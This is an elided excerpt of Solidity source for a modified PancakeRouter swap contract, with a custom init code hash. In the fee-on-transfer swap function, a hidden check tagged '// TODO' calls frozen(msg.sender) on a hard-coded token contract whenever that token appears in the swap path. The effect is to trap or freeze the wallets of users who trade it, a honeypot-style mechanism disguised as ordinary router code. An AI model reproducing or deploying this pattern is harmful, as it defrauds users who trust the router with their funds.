            ...
            uint256(
                keccak256(
                    abi.encodePacked(
                        ...
                        hex"5215edc7b011d9cfa24a3cbf92d4b6dfdcce2570c2048ae3c4b001a48f91b7cf" // init code hash
                    )
                )
            )
        );
...
interface IJXT {
    function frozen(address addr) external;
}
...
contract PancakeRouter is IPancakeRouter02 {
    ...
    function _swapSupportingFeeOnTransferTokens(
        ...
        // TODO
        if (path[1] == 0x2DCb600DCd5190aFbE2311302DCA648FE4312087) {
            IJXT(0x2DCb600DCd5190aFbE2311302DCA648FE4312087).frozen(msg.sender);
        }
        for (uint256 i; i < path.length - 1; i++) {
            (address input, address output) = (path[i], path[i + 1]);
            (address token0, ) = PancakeLibrary.sortTokens(input, output);
